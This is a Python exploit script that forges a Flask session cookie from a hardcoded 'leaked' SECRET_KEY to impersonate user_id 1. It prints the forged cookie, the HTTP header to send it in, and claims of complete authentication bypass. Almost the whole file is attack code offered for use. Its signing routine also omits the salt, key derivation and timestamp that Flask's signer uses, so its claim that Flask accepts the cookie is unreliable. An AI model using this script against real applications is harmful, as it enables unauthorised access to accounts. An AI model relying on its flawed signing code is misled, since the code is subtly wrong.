#!/usr/bin/env python3
# Flask Session Cookie Forging Exploit
# Using leaked SECRET_KEY to bypass authentication

import sys
import json
import base64
from datetime import datetime

# Flask-style session signing implementation
def forge_flask_session(SECRET_KEY, payload):
    """Forge a Flask session cookie using Flask's signing mechanism"""
    
    # Flask uses itsdangerous library internally
    # We'll implement the same signing process step by step
    
    # Step 1: Create a JSON payload and encode it with Base64
    # Flask uses URL-safe base64 (trailing = removed)
    session_json = json.dumps(payload, separators=(',', ':')).encode('utf-8')
    b64_encoded = base64.b64encode(session_json, altchars=b'-_').decode('ascii').rstrip('=')
    
    # Step 2: Sign the payload using HMAC-SHA256
    import hmac
    import hashlib
    
    # Flask signing format: payload.signature
    # The signature is HMAC-SHA256 of the base64 payload
    secret = SECRET_KEY.encode('utf-8')
    signature = hmac.new(secret, b64_encoded.encode('ascii'), hashlib.sha256).digest()
    
    # Step 3: Base64 encode the signature (URL-safe)
    b64_signature = base64.b64encode(signature, altchars=b'-_').decode('ascii').rstrip('=')
    
    # Step 4: Combine payload and signature with dot separator
    return f"{b64_encoded}.{b64_signature}"

# Main execution
if __name__ == "__main__":
    # Leaked SECRET_KEY from the application
    SECRET_KEY = 'G7x7pMBBduHU0HH5avEQ'
    
    # Session payload for Flask-Login authentication as user_id: 1
    # This mimics how Flask-Login stores authenticated user sessions
    session_payload = {
        '_fresh': True,  # Indicates the session is "fresh" (e.g., recently authenticated)
        '_id': 'de5a0e0e-98a7-48d3-9e5a-0a8b9c7d6e5f',  # Flask session ID
        'user_id': 1,  # Authenticated user ID
        '_user_id': 1  # Flask-Login user ID
    }
    
    print("=" * 60)
    print("Flask Session Cookie Forging")
    print("=" * 60)
    print(f"\nLeaked SECRET_KEY: {SECRET_KEY}")
    print(f"\nSession Payload:")
    for key, value in session_payload.items():
        print(f"  {key}: {value}")
    
    # Forge the session cookie
    forged_session = forge_flask_session(SECRET_KEY, session_payload)
    
    print(f"\n{'=' * 60}")
    print("FORGED SESSION COOKIE:")
    print(forged_session)
    print("=" * 60)
    
    print("\n[+] Exploit Details:")
    print("    - This cookie can bypass authentication")
    print("    - Grants access as authenticated user with user_id: 1")
    print("    - The cookie is signed with the leaked SECRET_KEY")
    print("    - Flask will accept this as a legitimate session")
    
    print(f"\n[+] Cookie Format (for HTTP requests):")
    print(f"    Cookie: session={forged_session}")
    
    print(f"\n[+] Security Impact: CRITICAL")
    print("    - Complete authentication bypass")
    print("    - Access to admin/user functionality")
    print("    - Session forgery vulnerability")
